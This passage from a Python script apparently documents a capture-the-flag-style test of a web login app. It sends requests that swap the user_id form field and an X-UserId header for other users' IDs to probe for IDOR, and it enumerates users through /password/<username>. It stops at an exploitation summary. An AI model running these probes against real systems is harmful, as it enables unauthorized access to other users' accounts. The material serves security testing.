print(f"  Session cookie payload: {{'user_id': 10032}}")
print(f"  Display name: John Doe")
print(f"  Username: test")

print("\n[2] TESTED VECTORS AND RESULTS")
print("-" * 80)

test_results = []

# Test 1: Form field user_id manipulation
print("\nVector: Form field user_id in POST /password/test")
for test_id in [10030, 10031, 10033, 10034, 10035, 10052]:
    form_data = {'username': 'test', 'password': 'test', 'user_id': str(test_id)}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
    welcome_match = re.search(r'Welcome, ([^!<]+)', r.text)
    welcome = welcome_match.group(1).strip() if welcome_match else "Error"
    result = "BLOCKED - shows John Doe" if welcome == "John Doe" else f"VULNERABLE - shows {welcome}"
    print(f"  user_id={test_id}: {result}")

# Test 2: X-UserId header manipulation
print("\nVector: X-UserId header")
for test_id in [10030, 10031, 10033, 10052, 10055]:
    headers_mod = headers.copy()
    headers_mod['X-UserId'] = str(test_id)
    form_data = {'username': 'test', 'password': 'test', 'user_id': '10032'}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers_mod)
    welcome_match = re.search(r'Welcome, ([^!<]+)', r.text)
    welcome = welcome_match.group(1).strip() if welcome_match else "Error"
    print(f"  X-UserId={test_id}: Shows {welcome}")

# Test 3: Discovered user enumeration
print("\nVector: User enumeration via /password/<username>")
users_tested = [
    ('test', '10032', 'John Doe'),
    ('flag', '10052', 'Flag')
]
for username, uid, name in users_tested:
    r = session.get(f"{BASE_URL}/password/{username}")
    uid_match = re.search(r'name=["\']user_id["\'][^>]+value=["\'](\d+)["\']', r.text)
    welcome_match = re.search(r'Welcome, ([^!<]+)', r.text)
    actual_uid = uid_match.group(1) if uid_match else "N/A"
    actual_name = welcome_match.group(1).strip() if welcome_match else "N/A"
    print(f"  /password/{username}: user_id={actual_uid}, name={actual_name}")

print("\n[3] ATTEMPTED EXPLOITATION SUMMARY")
print("-" * 80)

print("""
1. IDOR via form user_id parameter: BLOCKED
